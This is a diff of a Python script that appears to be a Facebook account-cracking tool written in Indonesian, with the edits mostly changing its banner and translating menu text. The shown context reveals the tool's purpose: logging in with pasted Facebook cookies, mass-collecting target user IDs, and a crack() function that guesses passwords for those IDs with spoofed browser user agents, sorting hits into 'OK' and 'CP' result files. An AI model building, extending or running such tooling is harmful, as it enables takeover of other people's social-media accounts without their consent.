@@ -266,10 +266,14 @@ def back():
 #------------------[ LOGO-LAKNAT ]-----------------#
 def banner():
 	print(f'''\t{asu}                                         
-\t 8b    d8    db    8b    d8 88   88 88b 88          Yb  dP     
-\t 88b  d88   dPYb   88b  d88 88   88 88Yb88 ________  YbdP      
-\t 88YbdP88  dP__Yb  88YbdP88 Y8   8P 88 Y88 """"""""  dPYb      
-\t 88 YY 88 dP""""Yb 88 YY 88 `YbodP' 88  Y8          dP  Yb                                                                                                   
+\t ##     ##    ###    ##     ## ##     ## ##    ##       ##     ##    
+\t ###   ###   ## ##   ###   ### ##     ## ###   ##        ##   ##     
+\t #### ####  ##   ##  #### #### ##     ## ####  ##         ## ##      
+\t ## ### ## ##     ## ## ### ## ##     ## ## ## ## #######  ###       
+\t ##     ## ######### ##     ## ##     ## ##  ####         ## ##      
+\t ##     ## ##     ## ##     ## ##     ## ##   ###        ##   ##     
+\t ##     ## ##     ## ##     ##  #######  ##    ##       ##     ##    
+                                                                                                   
 			{m}•{k}•{h}•{sir} 𝗔𝗨𝗧𝗛𝗢𝗥 : 𝗠𝗔𝗠𝗨𝗡 {x}{m}•{k}•{h}•{x}''')
 #--------------------[ BAGIAN-MASUK ]--------------#
 def login():
@@ -295,7 +299,7 @@ def login_lagi334():
 	try:
 		os.system('clear')
 		banner()
-		cetak(nel('\t©©© Saran Ektensi : [green]Cookiedough[white] ©©©'))
+		cetak(nel('\t©©© Login Cookies : [green]Cookiedough[white] ©©©'))
 		asu = random.choice([m,k,h,b,u])
 		cookie=input(f'  [{h}•{x}] Input Cookies :{asu} ')
 		data = requests.get("https://business.facebook.com/business_locations", headers = {"user-agent": "Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.92 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8","content-type":"text/html; charset=utf-8"}, cookies = {"cookie":cookie}) 
@@ -330,7 +334,6 @@ def menu(my_name,my_id):
 	cetak(nel('\tSelamat Datang [yellow]%s[white] Sayang'%(my_name)))
 	print(f'>> Your Idz : '+str(my_id))
 	print(f'>> Your Ip  : {ip}')
-	print(f'>> Github   : {gh}')
 	print('')
 	print('>> 1. Crack Public ')
 	print('>> 2. Crack Follower ')
@@ -361,11 +364,11 @@ def error():
 	print(f'{k}>> Maaf Fitur Ini Masih Di Perbaiki {x}')
 	time.sleep(4)
 	back()
-#-----------------[ HASIL-CRACK ]-----------------#
+#-----------------[ Results-CRACK ]-----------------#
 def result():
-	print(f'>> 1. Hasil {h}OK{x} Anda ')
-	print(f'>> 2. Hasil {k}CP{x} Anda ')
-	print('>> 3. Kembali	')
+	print(f'>> 1. Results {h}OK{x} Anda ')
+	print(f'>> 2. Results {k}CP{x} Anda ')
+	print('>> 3. Exit	')
 	kz = input(f'\n>> Pilih : ')
 	if kz in ['2']:
 		try:vin = os.listdir('CP')
@@ -467,7 +470,7 @@ def dump_massal():
 	except IOError:
 		exit()
 	try:
-		jum = int(input('>> Mau Berapa Target Njing ? : '))
+		jum = int(input('>> TARGET ID ? : '))
 	except ValueError:
 		print('>> Masukkan Angka Anjing, Malah Huruff ')
 		exit()
@@ -478,7 +481,7 @@ def dump_massal():
 	yz = 0
 	for met in range(jum):
 		yz+=1
-		kl = input('>> Masukkan Idz Yang Ke '+str(yz)+' : ')
+		kl = input('>> Input Idz Yang Ke '+str(yz)+' : ')
 		uid.append(kl)
 	for userr in uid:
 		try:
@@ -496,7 +499,7 @@ def dump_massal():
 			exit()
 	try:
 		print('')
-		print(f'>> Total Idz Yang Terkumpul🕺{h}'+str(len(id)))
+		print(f'>> Total Idz Yang Terkumpul{h}'+str(len(id)))
 		setting()
 	except requests.exceptions.ConnectionError:
 		print(f'{x}')
@@ -818,7 +821,7 @@ def passwrd():
 def crack(idf,pwv):
 	global loop,ok,cp
 	bo = random.choice([m,k,h,b,u,x])
-	sys.stdout.write(f"\r🕺 {P}[{b}{loop}{P}/{u}{len(id)}{P}]—{P}[{H}{ok}{P}]—{P}[{k}{cp}{x}]—[{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
+	sys.stdout.write(f"\r {P}[{b}{loop}{P}/{u}{len(id)}{P}]—{P}[{H}{ok}{P}]—{P}[{k}{cp}{x}]—[{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
 	sys.stdout.flush()
 	ua = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36'
 	ua2 = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36'
